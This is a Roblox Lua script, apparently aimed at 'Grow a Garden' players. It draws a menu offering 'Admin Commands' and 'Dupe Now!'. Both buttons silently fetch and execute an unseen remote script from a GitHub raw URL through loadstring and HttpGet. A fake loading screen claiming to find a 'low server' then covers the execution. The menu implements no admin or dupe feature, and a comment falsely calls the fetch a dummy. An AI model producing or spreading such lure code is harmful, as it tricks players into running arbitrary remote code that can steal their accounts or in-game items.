-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Main GUI Setup
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "CustomGui"
mainGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", mainGui)
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 0.05
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local layout = Instance.new("UIListLayout", mainFrame)
layout.Padding = UDim.new(0, 10)
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

-- Create Button
local function createButton(name)
	local btn = Instance.new("TextButton", mainFrame)
	btn.Size = UDim2.new(0.8, 0, 0, 40)
	btn.Text = name
	btn.Font = Enum.Font.Cartoon
	btn.TextSize = 24
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
	btn.AutoButtonColor = true
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
	return btn
end

-- Fullscreen Loading with Progress Bar
local function showLoadingScreen(message)
	local screen = Instance.new("ScreenGui", playerGui)
	screen.Name = "LoadingScreen"
	screen.IgnoreGuiInset = true
	screen.ResetOnSpawn = false

	local frame = Instance.new("Frame", screen)
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

	local label = Instance.new("TextLabel", frame)
	label.Size = UDim2.new(1, 0, 0, 100)
	label.Position = UDim2.new(0.5, 0, 0.4, 0)
	label.AnchorPoint = Vector2.new(0.5, 0.5)
	label.Text = message
	label.Font = Enum.Font.Cartoon
	label.TextSize = 30
	label.TextColor3 = Color3.new(1, 1, 1)
	label.BackgroundTransparency = 1

	local percent = Instance.new("TextLabel", frame)
	percent.Size = UDim2.new(0, 100, 0, 40)
	percent.Position = UDim2.new(0.5, 0, 0.5, 0)
	percent.AnchorPoint = Vector2.new(0.5, 0.5)
	percent.Text = "0%"
	percent.Font = Enum.Font.Cartoon
	percent.TextSize = 24
	percent.TextColor3 = Color3.new(1, 1, 1)
	percent.BackgroundTransparency = 1

	local progressBarBg = Instance.new("Frame", frame)
	progressBarBg.Size = UDim2.new(0.4, 0, 0, 10)
	progressBarBg.Position = UDim2.new(0.5, 0, 0.58, 0)
	progressBarBg.AnchorPoint = Vector2.new(0.5, 0.5)
	progressBarBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	Instance.new("UICorner", progressBarBg).CornerRadius = UDim.new(1, 0)

	local progressBar = Instance.new("Frame", progressBarBg)
	progressBar.Size = UDim2.new(0, 0, 1, 0)
	progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
	Instance.new("UICorner", progressBar).CornerRadius = UDim.new(1, 0)

	-- Loading Animation
	task.spawn(function()
		for i = 1, 100 do
			percent.Text = i .. "%"
			progressBar:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Sine", 0.05, true)
			wait(0.05)
		end

		-- Fade out
		TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
		TweenService:Create(label, TweenInfo.new(1), {TextTransparency = 1}):Play()
		TweenService:Create(percent, TweenInfo.new(1), {TextTransparency = 1}):Play()
		TweenService:Create(progressBar, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
		TweenService:Create(progressBarBg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()

		wait(1.1)
		screen:Destroy()
	end)
end

-- Load Script (Dummy for illustration)
local function runScript()
	pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
	end)
end

-- Button Click Handler
local function onButtonClick(btn, msg)
	-- Animate and hide buttons
	for _, child in ipairs(mainFrame:GetChildren()) do
		if child:IsA("TextButton") then
			child.Visible = false
		end
	end

	-- Animate frame away
	TweenService:Create(mainFrame, TweenInfo.new(0.4), {
		Size = UDim2.new(0, 0, 0, 0),
		Position = UDim2.new(0.5, 0, 0.5, 0)
	}):Play()

	wait(0.3)
	mainGui.Enabled = false

	-- Immediately run script
	runScript()

	-- Show loading screen
	showLoadingScreen(msg)
end

-- Buttons
local adminBtn = createButton("Admin Commands")
adminBtn.MouseButton1Click:Connect(function()
	onButtonClick(adminBtn, "Finding a Low Server In order Admin Commands Work.")
end)

local dupeBtn = createButton("Dupe Now!")
dupeBtn.MouseButton1Click:Connect(function()
	onButtonClick(dupeBtn, "Finding a Low Server In order Dupe to Work.")
end)
